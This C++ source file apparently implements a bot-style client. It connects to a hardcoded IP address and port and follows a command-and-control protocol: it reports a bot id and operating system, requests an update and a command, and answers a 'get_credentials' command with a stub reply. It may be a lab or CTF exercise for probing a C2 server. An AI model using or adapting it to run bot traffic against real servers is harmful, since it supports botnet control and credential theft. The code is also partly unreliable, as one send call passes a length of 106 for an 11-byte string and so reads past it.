#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#include <string>
#include <iostream>

using namespace std;

int main() {

    int sock;
    struct addrinfo hints;
    struct addrinfo *res = NULL;
    
    memset(&hints, 0, sizeof hints);

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char buffer[4096] = {0};
    char buffer2[4096] = {0};
    char buffer3[4096] = {0}; // get COMMAND 
    char buffer4[4096] = {0};



    if (getaddrinfo("52.58.97.202", "2357", &hints, &res) == 0) {
        
        sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
        connect(sock, res->ai_addr, res->ai_addrlen);
        freeaddrinfo(res);

        send(sock, "REPORT botid=2437018b280e2f36 os=windows <END>", 47, 0);
        printf("REPORT botid=2437018b280e2f36 os=windows <END>\n");
        recv(sock, buffer, 4096, 0);
        printf("%s", buffer);

        send(sock, "UPDATE version=1.33.7 <END>", 28, 0);
        printf("UPDATE version=1.33.7 <END>\n");
        recv(sock, buffer2, 4096, 0);
        printf("%s", buffer2);
    
        send(sock, "COMMAND <END>", 14, 0);
        printf("COMMAND <END>\n");
        recv(sock, buffer3, 4096, 0);

        std::string buf3(buffer3);
        printf("%s", buffer3);
        if (buf3.substr(0, 14) == "COMMAND hidden") {

            std::string dump = buf3;
            
            bool foundEnd = false;

            char trash[4096] = {0}; 

            while(!foundEnd) {
                for (int i = 0;i < dump.length(); i++) {
                    if (dump.at(i) == '>') {
                        foundEnd = true;
                    }
                }
                if (foundEnd) {
                    // printf("%s", trash);
                    printf("COMMAND hidden...\n");
                    break;
                }
                recv(sock,trash,4096,0);
                printf("%s",trash);
                
                dump = trash;
            }
            //printf("%s",total.c_str());
        }

        if (buf3 == "COMMAND get_credentials <END>\n") {
            send(sock, "cred <END>", 106, 0);
            printf("cred <END>\n");
        }

        send(sock, "DONE <END>", 11, 0);
        printf("DONE <END>\n");
        recv(sock, buffer4, 4096, 0);
        printf("%s", buffer4);

    }
}
